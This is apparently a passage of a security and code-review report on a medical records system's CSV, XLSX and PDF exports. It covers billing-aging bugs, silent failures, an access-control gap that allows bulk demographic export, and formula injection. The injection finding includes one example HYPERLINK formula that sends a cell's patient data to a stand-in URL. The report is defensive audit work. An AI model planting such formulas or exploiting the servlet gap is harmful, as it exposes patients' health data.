### S05-1: Formula guard from #5499 is missing on other patient-data CSV exports
- Severity: Medium
- Category: security
- Confidence: Confirmed (no guard in the code); exploitation not tested
- Disclosure: private
- Commit: 69f5a7f0 (#5499)
- Location:
  - `src/main/java/io/github/carlos_emr/carlos/report/pageUtil/RptDownloadCSVServlet.java:133-148` (form report) and `:454-485` (demographic report)
  - `src/main/webapp/WEB-INF/jsp/report/ClinicalReports.jsp:658-704` (writes the CSV) and `src/main/webapp/WEB-INF/jsp/report/ClinicalExport.jsp:51-57` (serves it as `oscarReport.csv`)
  - `src/main/webapp/js/table-export.js:35-41` (Ontario invoice list, `billingONStatus.jsp:751-754`)
- Problem:
  - #5323's acceptance asks for a "shared context-appropriate cell policy used for headers and data where text exports are meant for spreadsheets". The PR applied `SpreadsheetCsv.sanitizeCell` only to Report by Template and the dashboard export.
  - Two other `.csv` downloads still write raw values with `CSVPrinter.print`:
    - the demographic/form report: last/first name, address, city, phone, email, HIN, demographic-extension values (tab-delimited `.csv`);
    - the Clinical Reports CSV: patient name/demographic columns, plus the XLSX built from that CSV, which is safe.
  - `table-export.js` keeps its own older regex. It covers no full-width `＝＋－＠`, unlike the shared policy.
  - `dx_associations.csv` holds admin-entered codes and is re-imported, so leaving it unguarded is reasonable.
- Evidence: `RptDownloadCSVServlet` contains `csv.print(row.getProperty(name, ""));` and `csvp.print(prop.getProperty((String) vecFieldCaption.get(j), ""));`. `ClinicalReports.jsp` contains `csvp.print(commonRow(heading,demoHash, demoObj));`. None of the three files calls `SpreadsheetCsv`; grep for `sanitizeCell` finds only `ExportQueryHandler`, `ReportResultBudget` and `TabularExport`.
- Impact: a name, address or email such as `=HYPERLINK("https://x/?"&B2,"click")` stored for a patient (front desk, imports, patient-entered data) runs as a formula when staff open these exports in Excel or LibreOffice. That is the same exfiltration risk #5323 fixed for Report by Template. Nobody would notice.
- Correction: route all three writers through `SpreadsheetCsv.sanitizeCell`, for headers and cells. Make `table-export.js` apply the same policy, or call a shared JS copy that the same fixture cases test.

### S05-2: A/R CSV ages the billed amount; the A/R PDF ages the balance owing
- Severity: Medium
- Category: bug
- Confidence: Confirmed
- Commit: 4ef47a26 (#5521). The behaviour already existed in main's `csv_rep_account_rec.jrxml`; this rewrite re-implemented it and the new tests pin it.
- Location:
  - `src/main/java/io/github/carlos_emr/carlos/report/export/BcBillingCsv.java:120-125`
  - `src/main/resources/oscar/oscarBilling/ca/bc/reports/pdf_rep_account_rec.jrxml:338-378`
  - `src/main/java/io/github/carlos_emr/carlos/billings/ca/bc/MSP/MSPReconcile.java:1356-1371`
  - `src/test/java/io/github/carlos_emr/carlos/report/export/SpreadsheetExportsUnitTest.java` (`bill()` sets amount -1234.50 and amtOwing 12.50; the aging tests expect `-1234.50`)
- Problem: the CSV aging buckets are filled with `money(b.getAmount())`, the billed amount. The PDF of the same report prints `$F{amtOwing}`, which `getBillsByType` computes as billed minus MSP, history and private payments. Rows are dropped only when the balance is zero, so partly paid, adjusted or overpaid claims are all exported, each at its full billed amount. The commit message says "preserve A/R aging balances" and the doc says "Each claim retains its amount in exactly one bucket". Neither matches what the PDF reports.
- Evidence: CSV: `"4".equals(bucket) ? money(b.getAmount()) : ""`. PDF: `<expression>...format(new Double($F{amtOwing}))</expression>` under `printWhen serviceDateRange == "4"`.
- Impact:
  - Example: a claim billed $50 with $30 paid shows $20 in the PDF and $50 in the "Spread Sheet" export.
  - Receivables are overstated in exactly the file clinics import into collections or accounting tools, and the numbers silently disagree with the PDF.
- Correction: decide on balance owing, which matches the PDF. Use `getAmtOwing()`, or an empty bucket plus Unknown age when the balance is unknown. Add a separate "Billed" column if clinics need the billed figure. Fix the test fixture expectations and document the change.

### S05-3: After #5670, one malformed legacy value still fails the whole Invoice or remittance CSV with HTTP 500
- Severity: Low. This is an edge case: the current C12 upload (`GenTa2Action.java:478-484`) persists the row and then calls `Integer.parseInt` on the folio, so new uploads should normally store only numeric folios. Legacy, migrated or alternate-path rows are where the risk lies.
- Category: regression
- Confidence: Confirmed in the code paths; how often such data exists is unknown (Plausible)
- Commit: 4ef47a26 (#5521), left in place by a7e98625 (#5670)
- Location:
  - `src/main/java/io/github/carlos_emr/carlos/billings/ca/bc/MSP/MSPReconcile.java:374-391` and its call at `:1232`, outside the method's try block
  - `src/main/java/io/github/carlos_emr/carlos/report/export/TeleplanAmount.java:23-29`
  - `src/main/java/io/github/carlos_emr/carlos/report/export/BcRemittanceExportDao.java:60,94,107,123`
  - `src/main/java/io/github/carlos_emr/carlos/billings/ca/bc/MSP/CreateBillingReport2Action.java:276-282`
- Problem:
  1. Invoice CSV: strict mode throws `IllegalStateException("Billing explanation data could not be read")` if `Integer.parseInt(tc.getOfficeFolioClaimNo())` fails for any current C12 row. `TeleplanC12Dao.findCurrent()` is not filtered by date or payee, so one historic C12 row with a blank or non-numeric folio breaks every Invoice CSV for the clinic. Main logged the row and continued.
  2. MSP remittance billed and summary CSVs: `TeleplanAmount.decode` throws `NumberFormatException` or `ArithmeticException` on any malformed or fractional Teleplan amount, so the whole file returns 500. Main's `convCurValue` printed 0 for such an amount and still produced the file.
  3. The only diagnostic is `BC CSV export failed (java.lang.IllegalStateException)`. It is PHI-safe by design, but gives an admin no way to find or fix the row, so the export stays broken.

  #5670 ("keep BC CSV exports usable with malformed legacy rows") made amounts and dates tolerant in the accounting readers only. The tests stub the C12 path away: `doReturn(new Properties()).when(csv).currentC12Records();`.
- Evidence: `catch (NumberFormatException intEx) { if (failOnReadError) throw new IllegalStateException(...); ...}`, and `return new BigDecimal(digits).movePointLeft(2).setScale(2).toPlainString();` with no fallback.
- Impact: BC billing staff get a generic error page for the Invoice or remittance "Spread Sheet" while the PDF still works. The failure is visible but not actionable, and it is permanent until someone finds the row in the database.
- Correction:
  - Treat a malformed C12 folio as "no explanation" for that row: skip it, or log a count without values.
  - In the remittance CSVs, keep the source text, as #5670 does for accounting rows, for example `Unparsed Teleplan amount: …`.
  - Optionally, log a value-free locator such as the row's surrogate key, if policy allows.
  - Add tests that run without stubbing `currentC12Records`.

### S05-4: Report by Template XLSX now contains the CSV guard tab, and untrimmed values no longer become numbers
- Severity: Low
- Category: data-integrity
- Confidence: Confirmed
- Commit: 69f5a7f0 (#5499)
- Location:
  - `src/main/java/io/github/carlos_emr/carlos/report/reportByTemplate/ReportResultBudget.java:96,109`
  - `src/main/webapp/WEB-INF/jsp/oscarReport/reportByTemplate/resultReport.jsp:163`
  - `src/main/java/io/github/carlos_emr/carlos/report/reportByTemplate/actions/GenerateOutFiles2Action.java:121-150,165-172`
- Problem: the XLSX ("Export to XLSX") is built by re-parsing the CSV the page posts back in its hidden `csv` field, and that CSV now carries the guard.
  - Any cell beginning with `= + - @` (phone `+1 …`, notes `- see…`, handles `@…`) becomes the string `"\t+1 …"` in the workbook. XLSX string cells are never formulas, so the tab only damages the data.
  - Because cells are no longer trimmed (main's `Misc.getString` used `trimToEmpty`), values such as `" 12.50"` fail `CANONICAL_DECIMAL` and become text instead of numbers.
- Evidence: `cells[x][y] = numeric == null ? data[x][y] : numeric;` with `data` taken from the guarded CSV. On main the XLS cells came from an unguarded, trimmed CSV.
- Impact: users see leading whitespace in XLSX cells, and lookups, filters and sums on those columns quietly stop matching. No current check covers this; the Playwright checks test only plain values.
- Correction: build the XLSX from raw cell values, not the guarded CSV, or strip exactly one leading guard tab before writing an XLSX string cell. Decide whether to trim before numeric detection.

### S05-5: The release's CSV-only fixes make BC CSV and PDF totals disagree
- Severity: Low
- Category: silent-failure
- Confidence: Confirmed
- Commit: 4ef47a26 (#5521), a7e98625 (#5670)
- Location:
  - `src/main/java/io/github/carlos_emr/carlos/report/export/BcBillingCsv.java:152-162` compared with `src/main/java/io/github/carlos_emr/carlos/entities/MSPBill.java:401-423` (the PDF bucket logic)
  - `src/main/java/io/github/carlos_emr/carlos/billings/ca/bc/MSP/MSPReconcile.java:204-214,1611-1631,1698-1706` compared with `CreateBillingReport2Action.java:208-224` (the PDF summary)
- Problem:
  - A/R CSV puts day-91 claims in 91 Days+ and future service dates in 0 - 30 Days. The PDF still uses `getServiceDateRange()`, which places neither in any bucket (`daysOld > 91`; negative ages give "0"), although the PDF group total includes them.
  - In strict mode, the payments summary CSV keeps zero-amount and unparseable payments that carry an adjustment (`keepCsvPayment`) and adds their adjustment components to Electronic. The PDF path (`dblAmount != 0`) drops those rows and their adjustments.
- Evidence: `return days <= 30 ? "1" : days <= 60 ? "2" : days <= 90 ? "3" : "4";` compared with `else if (daysOld > 91) { ret = "4"; }`. Also `return sign != 0 || !bill.adjustmentCode.isEmpty();` compared with `if (dblAmount != 0) { billSearch.list.add(b); }`.
- Impact: for the same dates and filters the two formats report different bucket and category totals, and nothing says which is right. Clinics reconciling PDF against CSV will find mismatches.
- Correction: apply the same bucket and inclusion rules to the PDF path (shared helpers in `MSPBill`/`MSPReconcile`), or document the differences on the report page.

### S05-7: Removing `com.lowagie` (OpenPDF 1.3.43) and moving Jasper PDFs to PDF 2.0 are missing from the upgrade notes
- Severity: Low
- Category: breaking-change
- Confidence: Confirmed for the classpath change; the impact depends on site customisations (Plausible)
- Commit: ac8e3fb8 (#5515)
- Location:
  - `pom.xml:2321-2335` (the enforcer ban)
  - `dependencies-lock.json` (1.3.43 removed)
  - `docs/jasperreports-openpdf3.md:6,25-28`
- Problem:
  - On main the WAR carried OpenPDF 1.3.43, the `com.lowagie.*` iText-4 API, for Jasper. Site-local JSPs or scriptlets written in the OSCAR era against `com.lowagie.text.*` therefore compiled and ran by accident. They now fail with `NoClassDefFoundError` or a JSP compile error.
  - Jasper output (labels, invoices, statements, letters, Rourke, BCAR) now starts `%PDF-2.0`; OpenPDF 3's `PdfVersionImp` defaults to "2.0".
  - Both changes appear only in a developer doc. The release notes (#5746) and the API-change list (#5747) do not mention them.
- Evidence: `<exclude>com.github.librepdf:openpdf:(,3.0.0)</exclude>`. The lock now holds only `com.github.librepdf:openpdf:3.0.5`; main had both `com.github.librepdf:openpdf:1.3.43` and `com.github.librepdf.openpdf:openpdf:3.0.3`.
- Impact: customised installs break on upgrade. A few old printers or PDF tools may reject the 2.0 header, although main's application PDFs were already 2.0.
- Correction: add both items to the 2026.08 upgrade notes. The `com.lowagie` → `org.openpdf` migration hint is the main thing to state.

- #5670: malformed accounting dates and amounts keep their source text in detail rows. An unknown balance gives an empty Balance, and A/R keeps the claim. Fractional cents are labelled "Unparsed Teleplan amount". DB read failures still reach 500 with no cause attached.

### S05-P1: Report CSV download servlet performs no reporting-object privilege check
- Severity: Medium
- Category: security
- Confidence: Confirmed (traced in code; not executed)
- Pre-existing: yes (present on origin/main)
- Disclosure: private
- Location:
  - release `src/main/java/io/github/carlos_emr/carlos/report/pageUtil/RptDownloadCSVServlet.java:72-106` (`service`), mapped at `/report/reportDownload` (`src/main/webapp/WEB-INF/web.xml:638-640`)
  - main `RptDownloadCSVServlet.java:63-105`, same mapping (main `web.xml:646-648`)
  - the object-level gate lives only in the forwarding JSP, `src/main/webapp/WEB-INF/jsp/report/reportResult.jsp:6-13` (`_report,_admin.reporting` read)
- Problem: the servlet checks only that an HTTP session exists (`if (session == null) return;`). It performs no `SecurityInfoManager.hasPrivilege` / `_report` check, and it builds and runs the demographic and form reports straight from request parameters. The reporting privilege is enforced only by `reportResult.jsp`, which forwards to the servlet by name, but the servlet is also mapped directly at `/report/reportDownload`. `web.xml` declares a `security-constraint` only for `/monitoring`, and CARLOS enforces object rights per JSP/action rather than through a filter, so an authenticated user who lacks `_report`/`_admin.reporting` can reach the servlet directly. The result is a bulk CSV of patient demographics (name, HIN, address, phone, email, configured extensions) and form reports.
- Evidence: the servlet's only guard is `HttpSession session = request.getSession(false); if (session == null) return;`. Grep for `hasPrivilege|_report|oscarSec` in the servlet returns nothing on both main and release.
- Impact: an account without the reporting privilege can export the demographic database in bulk, bypassing the `_report`/`_admin.reporting` gate that the UI applies. Within the circle-of-care model many staff can already view individual demographics, which is why this is Medium rather than higher, but bulk export is exactly what the reporting object is meant to restrict.
- Correction: add the same `_report`/`_admin.reporting` `hasPrivilege` check to the servlet itself (defence in depth), matching `reportResult.jsp`, so the object right is enforced wherever the URL is reached.

### S05-P2: OscarDocumentCreator swallows JRException, so a failed PDF/report fill downloads as empty or partial with HTTP 200
- Severity: Medium
- Category: silent-failure
- Confidence: Confirmed
- Pre-existing: yes (present on origin/main)
- Location:
  - release `src/main/java/io/github/carlos_emr/OscarDocumentCreator.java:203-205` (`fillDocumentStream`), `:219-222`/`:230-233` (`getJasperReport`)
  - main `OscarDocumentCreator.java:227` (and `:243`, `:254`)
  - immediate callers still on this path: `CreateBillingReport2Action` BC PDF branches (`:148,155,202,236,245`), `printLabDaySheet2Action.java:151`, `PrintAppointmentReceipt2Action.java:202`
- Problem: `fillDocumentStream` catches `JRException`, logs `"Error"` and returns normally. The response headers (`cfgHeader`, which opens the output stream) are already set by the BC PDF caller before the fill runs, so a compile/fill/export failure produces a 200 response with an empty or truncated PDF rather than an error. This is the open item in `docs/pdf-font-policy.md` and overlaps known issue #5777 (the BC remittance PDF read failure). The CSV/XLSX exports moved off this path in the release (issue #5438), but every BC PDF, the lab/bill day sheets and the appointment receipt still use it.
- Evidence: `} catch (JRException ex) { MiscUtils.getLogger().error("Error", ex); }` with no rethrow and no `sendError`; the method returns `void`.
- Impact: BC billing/report PDFs, day sheets and receipts can download blank or partial with a success status, giving clinicians an empty document and no error. Contradicts CLAUDE.md "Direct Response Actions".
- Correction: validate the generated bytes (buffer, check `%PDF`) before writing, and on failure call `sendError(...)` and return `NONE`, as the release's new CSV/XLSX paths already do. Track with #5777.

### S05-P4: BC A/R and payment-summary PDFs drop or mis-bucket claims the data includes
- Severity: Low
- Category: data-integrity
- Confidence: Confirmed
- Pre-existing: yes (present on origin/main)
- Location:
  - PDF aging buckets use `MSPBill.getServiceDateRange()` (`src/main/java/io/github/carlos_emr/carlos/entities/MSPBill.java:401-423`): `daysOld > 91` for bucket 4 (so day 91 falls in no bucket) and negative ages return `"0"` (future-dated claims fall in no bucket), while the PDF group total sums all amounts (`pdf_rep_account_rec.jrxml`)
  - payment detail/summary PDF path drops zero-amount rows: main `MSPReconcile.java:1600,1664` (`if (dblAmount != 0)`), release `:1628,1704,1762`
- Problem: the A/R PDF leaves day-91 and future-dated claims out of every bucket although the total counts them, so the bucket columns and the row total disagree. The payment PDF drops rows whose amount is 0, discarding any adjustment they carry. These are long-standing legacy behaviours in `MSPBill`/`MSPReconcile`. The release's new CSV paths bucket and include these rows differently, which is what makes the CSV and PDF disagree (S05-5); the PDF side of that mismatch is this pre-existing defect.

- Impact: BC A/R PDF bucket columns can under-report versus the printed total; payment PDFs omit zero-value adjustment rows. Pre-dates the release.
- Correction: fix `getServiceDateRange` boundaries (`>= 91`, and a rule for future dates) and reconcile the zero-amount inclusion rule with the CSV path, ideally through one shared helper.

### S05-P5: Invoice explanation lookup keys do not match (billing_no vs billingmaster_no)
- Severity: Low
- Category: bug
- Confidence: Plausible
- Pre-existing: yes (present on origin/main)
- Location:
